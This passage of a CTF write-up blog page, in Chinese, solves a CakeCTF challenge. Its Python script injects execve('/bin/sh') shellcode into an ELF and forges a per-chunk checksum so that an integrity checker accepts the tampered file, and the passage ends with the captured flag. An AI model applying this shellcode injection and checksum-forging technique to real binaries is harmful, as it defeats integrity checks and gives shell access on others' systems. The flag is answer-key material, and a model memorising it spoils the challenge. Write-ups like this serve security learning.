+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-python data-lang=python><span class=n>chksm</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./sample.aldrya&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+<span class=n>chksm_list</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>chksm</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;little&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>chksm</span><span class=p>),</span> <span class=mi>4</span><span class=p>)][</span><span class=mi>1</span><span class=p>:]</span>
+
+<span class=n>shellcode</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class=s1>&#39;</span>
+<span class=n>data</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;sample.elf&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+<span class=n>patch_addr</span> <span class=o>=</span> <span class=mh>0x1060</span>
+<span class=n>chunk_size</span> <span class=o>=</span> <span class=mh>0x100</span>
+<span class=n>chunk_idx</span> <span class=o>=</span> <span class=n>patch_addr</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>  <span class=c1># idx = 16</span>
+<span class=n>chunk_addr</span> <span class=o>=</span> <span class=n>chunk_idx</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span>
+<span class=n>patch_idx</span> <span class=o>=</span> <span class=n>patch_addr</span> <span class=o>-</span> <span class=n>chunk_addr</span>
+
+
+<span class=k>def</span> <span class=nf>x86_ror</span><span class=p>(</span><span class=n>num</span><span class=p>,</span> <span class=n>shift</span><span class=o>=</span><span class=mi>1</span><span class=p>):</span>
+    <span class=n>shift</span> <span class=o>%=</span> <span class=mi>32</span>
+    <span class=n>tmp</span> <span class=o>=</span> <span class=n>num</span> <span class=o>&amp;</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=n>shift</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
+    <span class=k>return</span> <span class=p>(</span><span class=n>tmp</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span> <span class=o>-</span> <span class=n>shift</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>num</span> <span class=o>&gt;&gt;</span> <span class=n>shift</span><span class=p>)</span>
+
+
+<span class=k>def</span> <span class=nf>gen_checksm</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>init_chksm</span><span class=o>=</span><span class=mh>0x20210828</span><span class=p>):</span>
+    <span class=k>for</span> <span class=n>el</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
+        <span class=n>init_chksm</span> <span class=o>=</span> <span class=n>x86_ror</span><span class=p>(</span><span class=n>el</span> <span class=o>^</span> <span class=n>init_chksm</span><span class=p>)</span>
+    <span class=k>return</span> <span class=n>init_chksm</span>
+
+
+<span class=k>def</span> <span class=nf>patch</span><span class=p>(</span><span class=n>orig</span><span class=p>,</span> <span class=n>patch_data</span><span class=p>,</span> <span class=n>start_idx</span><span class=p>):</span>
+    <span class=k>return</span> <span class=n>orig</span><span class=p>[:</span><span class=n>start_idx</span><span class=p>]</span> <span class=o>+</span> <span class=n>patch_data</span> <span class=o>+</span> <span class=n>orig</span><span class=p>[</span><span class=n>start_idx</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>patch_data</span><span class=p>):]</span>
+
+
+<span class=k>def</span> <span class=nf>rebuild_by_hand</span><span class=p>(</span><span class=n>orig</span><span class=p>,</span> <span class=n>target_chksm</span><span class=p>):</span>
+    <span class=n>byte_to_rebuild</span> <span class=o>=</span> <span class=mi>32</span>
+    <span class=n>orig</span> <span class=o>=</span> <span class=n>orig</span><span class=p>[:</span><span class=o>-</span><span class=n>byte_to_rebuild</span><span class=p>]</span>
+    <span class=n>init_chksm</span> <span class=o>=</span> <span class=n>gen_checksm</span><span class=p>(</span><span class=n>orig</span><span class=p>)</span>
+    <span class=n>target_list</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>byte_to_rebuild</span><span class=p>):</span>
+        <span class=n>temp</span> <span class=o>=</span> <span class=p>(</span><span class=n>target_chksm</span> <span class=o>&gt;&gt;</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>
+        <span class=n>temp</span> <span class=o>^=</span> <span class=p>(</span><span class=n>init_chksm</span> <span class=o>&gt;&gt;</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>1</span>
+        <span class=n>target_list</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>temp</span><span class=p>])</span>
+    <span class=n>a</span> <span class=o>=</span> <span class=n>gen_checksm</span><span class=p>(</span><span class=n>orig</span> <span class=o>+</span> <span class=n>target_list</span><span class=p>)</span>
+    <span class=n>b</span> <span class=o>=</span> <span class=n>chksm_list</span><span class=p>[</span><span class=n>chunk_idx</span><span class=p>]</span>
+    <span class=k>return</span> <span class=n>orig</span> <span class=o>+</span> <span class=n>target_list</span>
+
+
+<span class=n>curr_chunk</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>chunk_idx</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>:(</span><span class=n>chunk_idx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>]</span>
+
+<span class=n>patched_chunk</span> <span class=o>=</span> <span class=n>patch</span><span class=p>(</span><span class=n>curr_chunk</span><span class=p>,</span> <span class=n>shellcode</span><span class=p>,</span> <span class=n>patch_idx</span><span class=p>)</span>
+<span class=n>patched_chunk</span> <span class=o>=</span> <span class=n>rebuild_by_hand</span><span class=p>(</span><span class=n>patched_chunk</span><span class=p>,</span> <span class=n>chksm_list</span><span class=p>[</span><span class=n>chunk_idx</span><span class=p>])</span>
+
+<span class=n>final_data</span> <span class=o>=</span> <span class=n>patch</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>patched_chunk</span><span class=p>,</span> <span class=n>chunk_addr</span><span class=p>)</span>
+
+<span class=nb>open</span><span class=p>(</span><span class=s1>&#39;sample_patched.elf&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>final_data</span><span class=p>)</span>
+</code></pre></td></tr></table></div></div><p>把檔案丟到 <a href=http://transfer.sh/>http://transfer.sh/</a> ，官方 server 吃 https 會爛掉，所以把網址改成 http 上傳，就可以拿 shell</p><p><img src=img/2.png alt></p><h3 id=flag-3>Flag</h3><p><code>CakeCTF{jUst_cH3ck_SHA256sum_4nd_7h47's_f1n3}</code></p><blockquote><p>這題也幾乎不用逆向，但挺有趣的</p></blockquote></div><div class=post-footer><div class=info><span class=separator><a class=category href=/blog/categories/ctf/>CTF</a></span>
+<span class=separator><a class=tag href=/blog/tags/ctf/>CTF</a><a class=tag href=/blog/tags/cakectf/>CakeCTF</a><a class=tag href=/blog/tags/reverse/>Reverse</a><a class=tag href=/blog/tags/misc/>Misc</a></span></div></div></div></div></div></main></div><footer class="footer footer--base"><div class=by_farbox><ul class=footer__list><li class=footer__item>&copy;
+artis24106
+2021</li></ul></div></footer><script type=text/javascript src=/blog/js/medium-zoom.min.bdc7b23aff63497a79433b3920b03e2473399d90ad4c2d87cf7c08d33d61966f.js integrity="sha256-vceyOv9jSXp5Qzs5ILA+JHM5nZCtTC2Hz3wI0z1hlm8=" crossorigin=anonymous></script></body></html>
